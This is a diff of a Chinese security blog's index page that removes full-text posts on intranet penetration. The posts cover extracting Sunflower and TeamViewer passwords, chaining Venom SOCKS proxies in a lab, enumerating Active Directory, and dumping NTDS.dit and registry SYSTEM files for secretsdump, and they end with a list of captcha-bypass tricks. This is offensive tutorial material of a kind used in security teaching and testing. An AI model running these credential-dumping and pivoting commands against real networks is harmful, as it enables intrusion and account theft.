-<p>新版的向⽇葵 配置⽂件没有这⼏个字段，但是这些字段还可以⽤。需要重启向⽇葵⽣效 （安装版重启需要bypassuac）（绿⾊版） 假设对⽅安装了向⽇葵，（安装版），可以更改⾃⼰的向⽇葵验证码喝识别码，保持与对⽅⼀致也可以连接</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/wafinfo/Sunflower_get_Password/">https://github.com/wafinfo/Sunflower_get_Password/</a></p>
-<p>teamviewer获取密码 提取TeamViewer要⽤到的⼯具是由github会员uknowsec提供，使⽤⼯具名SharpDecryptPwd.exe。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sharpDecryptPwd.exe -teamviewer</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="致命守护者-Venom"><a href="#致命守护者-Venom" class="headerlink" title="致命守护者(Venom)"></a>致命守护者(Venom)</h1><p>Venom是为了快速建立多层代理而使用的工具</p>
-<p>测试环境：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击机： 192.168.137.1</span><br><span class="line">dmz:192.168.52.143</span><br><span class="line">办公:192.168.52.138</span><br><span class="line">核心：192.168.52.141</span><br></pre></td></tr></table></figure>
-
-<p>配置设施为:攻击机ping不通办公和核心，dmz可以ping通办公，但是不能ping核心。办公机可以ping核心机。</p>
-<ol>
-<li>攻击机开启监听</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin.exe -lport 9999</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172026692.png" alt="image-20220222172026692"></p>
-<ol start="2">
-<li>dmz机器开启代理连接</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -rhost 攻击机IP -rport 9999</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172238410.png" alt="image-20220222172238410"></p>
-<ol start="3">
-<li>执行命令，将流量代理到7777端口</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">goto 1</span><br><span class="line">socks 7777</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172352241.png" alt="image-20220222172352241"></p>
-<ol start="4">
-<li>将agent.exe上传至内网办公主机</li>
-</ol>
-<p>并在攻击机上让节点一进行监听，也就是在边缘机器dmz上等待内网办公机器连接。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen 9998</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172604414.png" alt="image-20220222172604414"></p>
-<p>在内网主机上执行命令连接dmz机器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -rhost 192.168.52.143 -rport 9998</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172710014.png" alt="image-20220222172710014"></p>
-<p>这时候在攻击机上使用show命令，查看节点，就可以发现已经有2个节点，选择节点2，并将socks代理到本机9998端口。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172853565.png" alt="image-20220222172853565"></p>
-<p>这时候只要挂上代理就可以访问内网核心主机了。</p>
-<p>内⽹穿透时，代理需要稳定、隐蔽，思路更需要不断的拓宽。毕竟在实战中，多么复杂的环境都会遇到，更多的是 总结不同打法，进⾏落地，最终将内⽹的“⼤⻔”打开！</p>
-
+        
+          <a class="article-more-a" href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#more">more >></a>
+        
       
 
       
@@ -426,66 +450,9 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt=ns lab.com  //定位DC</span><br><span class="line">net time /domain //查看时间服务器</span><br><span class="line">hostname //查看本机名字</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235536326.png" alt="image-20220219235536326"></p>
-<h1 id="二、定位DC及获取用户、组信息"><a href="#二、定位DC及获取用户、组信息" class="headerlink" title="二、定位DC及获取用户、组信息"></a>二、定位DC及获取用户、组信息</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">net config workstation //查询当前登陆域及登录的用户信息</span><br><span class="line">net user /domain  //查询域内用户</span><br><span class="line">wmic useraccount get /all 查询域内用户的详细信息</span><br><span class="line">net accounts /domain 查看域的密码策略</span><br><span class="line">net user xxx /domain  查看指定域用户lab的详细信息</span><br><span class="line">net view /domain 查看有几个域</span><br><span class="line">net view /domain:xxx 查看域内的主机</span><br><span class="line">net group /domain 查看域里面的组</span><br><span class="line">net group &quot;domainn users&quot; //查看域用户</span><br><span class="line">net group &quot;domain controllers&quot; /domian 查看域控制器</span><br><span class="line">net group &quot;domain computers&quot; /domain查看域内所有主机</span><br><span class="line">net group &quot;domain admins&quot; /domain查看域管理员，该组内的成员对域控拥有完全控制权</span><br><span class="line">net group &quot;enterprise admins&quot; /domain 查看企业管理组，该组内的成员对域控拥有完全控制权</span><br><span class="line">net group &quot;domain guest&quot; /domain 查看域访客组，权限较低</span><br><span class="line">net accounts /domain #查询域密码策略</span><br><span class="line">whoami /user #查看⽤户SID和域SID</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220001656102.png" alt="image-20220220001656102"></p>
-<p>域的sid是500之前的，用户sid是500</p>
-<p>当你是域控用户的时候可以输入以下命令查询域内信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dsquery user #查询⽬录中的⽤户</span><br><span class="line">dsquery computer #查询⽬录中的主机</span><br><span class="line">dsquery group #查询⽬录中的组</span><br><span class="line">dsquery ou #查询⽬录中的组织单元</span><br><span class="line">dsquery site #查询⽬录中的站点</span><br><span class="line">dsquery server #查询域控</span><br><span class="line">dsquery contact #查询⽬录中的联系⼈</span><br><span class="line">dsquery subnet #查询⽬录中的⼦⽹</span><br><span class="line">dsquery quota #查询⽬录中的配额规定</span><br><span class="line">dsquery partition #查询⽬录中的分区</span><br><span class="line">dsquery server –domain lab.com | dsget server–dnsname –site #搜索域内</span><br><span class="line">域控制器的DNS主机名和站点名</span><br><span class="line">dsquery computer domainroot –name -xp –limit n #搜索域内以-xp结尾的机</span><br><span class="line">器n台</span><br><span class="line">dsquery user domainroot –name admin -limit n #搜索域内以admin开头</span><br><span class="line">的⽤户n个</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="三、登陆历史"><a href="#三、登陆历史" class="headerlink" title="三、登陆历史"></a>三、登陆历史</h1><p>最原始的方式是通过注册表里HKEY_USERS的key值来查询谁登录过本机，同样也调用到了 NetSessionEnum API。但是有以下工具可以帮助我们快速查看</p>
-<h2 id="1-psloggedon-exe"><a href="#1-psloggedon-exe" class="headerlink" title="1.psloggedon.exe"></a>1.psloggedon.exe</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">PsLoggedOn - Windows Sysinternals | Microsoft Docs</a></p>
-<p>此工具用于查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe \\域名</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220002424852.png" alt="image-20220220002424852"></p>
-<h2 id="2-PVEFindADUser-exe"><a href="#2-PVEFindADUser-exe" class="headerlink" title="2.PVEFindADUser.exe"></a>2.PVEFindADUser.exe</h2><p><a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/blob/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe">Tools/PVEFindADUser.exe at master · chrisdee/Tools · GitHub</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe -current -target hostname</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220003159391.png" alt="image-20220220003159391"></p>
-<h2 id="3-Powerview-ps1"><a href="#3-Powerview-ps1" class="headerlink" title="3.Powerview.ps1"></a>3.Powerview.ps1</h2><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br></pre></td></tr></table></figure>
-
-<p>powerview.ps1是非常全面的，它有如下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1. Get-NetDomain 获取当前⽤户所在域的名称</span><br><span class="line">2. Get-NetUser 获取所有⽤户的详细信息</span><br><span class="line">3. Get-NetDomainController 获取所有域控制器的信息</span><br><span class="line">4. Get-NetComputer 获取域内所有机器的详细信息</span><br><span class="line">5. Get-NetPrinter 获取域中所有当前计算机对象的数组</span><br><span class="line">6. Get-NetOU 获取域内的OU信息</span><br><span class="line">7. Get-NetGroup 获取所有域内组和组成员的信息</span><br><span class="line">8. Get-NetGroupMember 获取指定域组中所有当前⽤户的列表</span><br><span class="line">9. Get-NetFileServer 根据SPN获取当前域使⽤的⽂件服务器信息</span><br><span class="line">10. Get-NetShare 获取当前域内所有的⽹络共享信息</span><br><span class="line">11. Get-DFSshare 获取域上所有分发⽂件系统共享的列表</span><br><span class="line">12. Get-NetSubnet 获取域的其他⽹段</span><br><span class="line">13. Get-NetSite 获取域内的当前站点</span><br><span class="line">14. Get-NetDomainTrust 获取当前⽤户域的所有信任</span><br><span class="line">15. Get-NetForestTrust 获取与当前⽤户的域关联的林的所有信任</span><br><span class="line">16. Find-ForeignUser 枚举在其主域之外的组中的⽤户</span><br><span class="line">17. Find-ForeignGroup 枚举域组的所有成员并查找查询域之外的⽤户</span><br><span class="line">18. Invoke-MapDomainTrust 尝试构建所有域信任的关系映射</span><br><span class="line">19. Get-NetLoggedon 获取主动登录到指定服务器的⽤户</span><br><span class="line">20. Get-NetLocalGroup 获取⼀个或多个远程主机上本地组的成员</span><br><span class="line">21. Get-NetSession 获取指定服务器的会话</span><br><span class="line">22. Get-NetRDPSession 获取指定服务器的远程连接</span><br><span class="line">23. Get-NetProcess 获取远程主机的进程</span><br><span class="line">24. Get-UserEvent 获取指定⽤户的⽇志</span><br><span class="line">25. Get-ADObject 获取活动⽬录的对象</span><br><span class="line">26. Get-NetGPO 获取域内所有的组策略对象</span><br><span class="line">27. Get-NetGPOGroup 获取域中设置”受限组”的所有GPO</span><br><span class="line">28. Find-GPOLocation 获取⽤户/组，并通过GPO枚举和关联使其具有有效权限的计</span><br><span class="line">算机</span><br><span class="line">29. Find-GPOComputerAdmin 获取计算机并通过GPO枚举确定谁对其具有管理权限</span><br><span class="line">30. Get-DomainPolicy 获取域默认策略或域控制器策略</span><br><span class="line">31. Get-DomainSID 返回指定域的SID</span><br><span class="line">32. Invoke-UserHunter 获取域⽤户登录的计算机信息及该⽤户是否有本地管理员权</span><br><span class="line">限</span><br><span class="line">33. Invoke-ProcessHunter 通过查询域内所有的机器进程找到特定⽤户</span><br><span class="line">34. Invoke-UserEventHunter 根据⽤户⽇志查询某域⽤户登陆过哪些域机器</span><br><span class="line">35. Invoke-ShareFinder 在本地域中的主机上查找（⾮标准）共享</span><br><span class="line">36. Invoke-FileFinder 在本地域中的主机上查找潜在的敏感⽂件</span><br><span class="line">37. Find-LocalAdminAccess 在域上查找当前⽤户具有本地管理员访问权限的计算机</span><br><span class="line">38. Find-ManagedSecurityGroups 搜索受管理的活动⽬录安全组并标识对其具有写</span><br><span class="line">访问权限的⽤户，即这些组拥有添加或删除成员的能⼒</span><br><span class="line">39. Get-ExploitableSystem 发现系统可能易受常⻅攻击</span><br><span class="line">40. Invoke-EnumerateLocalAdmin 枚举域中所有计算机上本地管理员组的成员</span><br></pre></td></tr></table></figure>
-
-<h1 id="四、域信任关系"><a href="#四、域信任关系" class="headerlink" title="四、域信任关系"></a>四、域信任关系</h1><p>域信任是为了解决多域环境中的跨域资源共享问题而诞生的。两个域之间必须拥有信任关系，才可以访问到对方域内的资源。任何一个新的子域加入到域树之后。这个域会自动信任其上一层的父域，同时父域也会自动信任新子域，而且这些信任具有双向传递性。由于此信任⼯作是通过Kerberos security protocol来完成的，因为也被成为KerberosTrust。</p>
-<p>域信任利⽤DNS服务器定位两个不同⼦域的域控制器，如果两个域中的域控制器都⽆法 找到另⼀个域，那么也就不存在通过域信任关系进⾏跨域资源共享。</p>
-<p>域环境不会⽆条件地接收来⾃其他域的凭证，只会接收来⾃受信任的域的凭证。在默认 情况下,特定 Windows域中的所有⽤户都可以通过该域中的资源进⾏身份验证。通过这种⽅式, 域可以为其⽤户提供对该域中所有资源的安全访问机制。如果⽤户想要访问边界以外的资源, 需要使⽤域信任。 </p>
-<p>域信任关系类型： ● 单向信任 是指在两个域之间创建单向的信任路径，即在⼀个⽅向.上是信任流，在另⼀个⽅向 上是访问流。在受信任域和信任域之间的单向信任中，受信任域内的⽤户或计算机可以访问信 任域中的资源，但信任域内的⽤户却⽆法访问受信任域内的资源。也就是说，若A域信任B 域，那么B域内受信任的主体可以访问A域内信任B域的资源。 ● 双向信任 是指两个单向信任的组合，信任域和受信任域彼此信任，在两个⽅向上都有信任流 和访问流。这意味着，可以从两个⽅向在两个域之间传递身份验证请求。活动⽬录中的所有域 信任关系都是双向可传递的。在创建⼦域时，会在新的⼦域和⽗域之间⾃动创建双向可传递信 任关系。 </p>
-<p>建⽴信任的⽬的是允许来⾃⼀个域的⽤户访问资源（如服务器上的本地管理员组），嵌套在组 中或以其他⽅式使⽤另⼀个域中的安全主体（例如⽤于 AD 对象 ACL ）。 对此有个例外是域 林内信任（存在于同⼀ Active Directory 林中的域信任）——在林中创建的任何域都与林中的 每个其他域保持隐式双向、可传递的信任关系。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts  //查看域信任信息</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220004301275.png" alt="image-20220220004301275"></p>
-<h1 id="五、NTDS-dit导出hash"><a href="#五、NTDS-dit导出hash" class="headerlink" title="五、NTDS.dit导出hash"></a>五、NTDS.dit导出hash</h1><p>在活动目录中，所有的数据都保存在域控的ntds.dit文件中。</p>
-<p>ntds.dit是一个二进制文件，文件路径为域控的<code>%SystemRoot%\ntds\ntds.dit</code>。NTDS.dit包含不限于用户名、散列值、组、GPP、OU等活动目录的信息。系统运维人员可以使用VSS（Volumn shadow copy servcice，卷映射拷贝服务）。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先在cmd中创建快照</span><br><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005025693.png" alt="image-20220220005025693"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用GUID挂在快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;刚才的快照序号&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005512106.png" alt="image-20220220005512106"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将挂载文件中的ntds.dit复制出来</span><br><span class="line">copy C:\$SNAP_20220220048_VOLUMEC$\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005909927.png" alt="image-20220220005909927"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">卸载快照并删除快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;序列号&#125;&quot; &quot;delete &#123;序列号&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220010236881.png" alt="image-20220220010236881"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询当前系统所有快照</span><br><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure>
-
-<p>要想得到域的用户名导出信息等，还需要注册表下的system文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system c:\system</span><br></pre></td></tr></table></figure>
-
-<p>要想提取ntds.dit的hash也有很多方法，这里就只拿出一点简便的</p>
-<p>使用impack工具包下的secretsdump.py</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -system system -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
-
-<p>然后解出来的hash去解密就好了。</p>
-
+        
+          <a class="article-more-a" href="/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/#more">more >></a>
+        
       
 
       
@@ -1326,190 +1293,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/01/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A6/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-逻辑漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-12-28T03:35:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="验证码绕过，密码找回漏洞"><a href="#验证码绕过，密码找回漏洞" class="headerlink" title="验证码绕过，密码找回漏洞"></a>验证码绕过，密码找回漏洞</h1><h2 id="验证码绕过常见姿势"><a href="#验证码绕过常见姿势" class="headerlink" title="验证码绕过常见姿势"></a>验证码绕过常见姿势</h2><ol>
-<li><p>前端验证验证码，并没有后端验证，直接抓包然后进行跑数据包，反正没有验证码的阻碍。</p>
-</li>
-<li><p>验证码设置了但是并没有验证，乱输入验证码也能够成功的登录。</p>
-</li>
-<li><p>验证码可以重复使用。</p>
-</li>
-<li><p>验证码空值绕过，比如我们抓一个包，发现有验证码参数，但是我们去掉验证码的参数就可以绕过验证码机制。验证码就失败了。</p>
-</li>
-<li><p>验证码干扰过低，使用脚本识别。</p>
-</li>
-<li><p>验证码在直接在html里面输出。</p>
-</li>
-<li><p>验证码可控，比如他的验证码包含在url面，是一个url传参，我们可以把url设置定，那么验证码可设置。</p>
-</li>
-<li><p>验证码有规则，比如用时间戳的后6位。</p>
-</li>
-<li><p>万能验证码，验证码无论是什么，只要输入特定数字就可以直接绕过。</p>
-</li>
-<li><p>验证码有时候会在cookie里面，分析一下是不是存在验证码的参数。</p>
-</li>
-<li><p>图片验证码，类型太少，容易识别。</p>
-</li>
-<li><p>多次登录后才出现验证码绕过:</p>
-</li>
-<li><p>基于session</p>
-</li>
-<li><p>基于ip</p>
-</li>
-<li><p>基于用户</p>
-</li>
-</ol>
-        
-          <a class="article-more-a" href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-json格式解析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/">json格式解析</a>
-    </h1>
-  
-
-        
-        <a href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2021-12-14T08:14:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="json文件格式"><a href="#json文件格式" class="headerlink" title="json文件格式"></a>json文件格式</h1><h2 id="JSON是什么"><a href="#JSON是什么" class="headerlink" title="JSON是什么"></a>JSON是什么</h2><p>（JavaScript Object Notation）json是一种轻量级的数据交换格式。现在是理想的数据交换语言。</p>
-<h3 id="JSON构建于两种结构："><a href="#JSON构建于两种结构：" class="headerlink" title="JSON构建于两种结构："></a>JSON构建于两种结构：</h3><h4 id="1-“名称-值”对的集合（A-collection-of-name-value-pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）"><a href="#1-“名称-值”对的集合（A-collection-of-name-value-pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）" class="headerlink" title="1.“名称/值”对的集合（A collection of name/value pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）"></a>1.“名称/值”对的集合（A collection of name/value pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）</h4><h4 id="2-值得有序列表。（大部分被理解为数组）"><a href="#2-值得有序列表。（大部分被理解为数组）" class="headerlink" title="2. 值得有序列表。（大部分被理解为数组）"></a>2. 值得有序列表。（大部分被理解为数组）</h4>
-        
-          <a class="article-more-a" href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/">展开全文 >></a>
         </p>
       
 
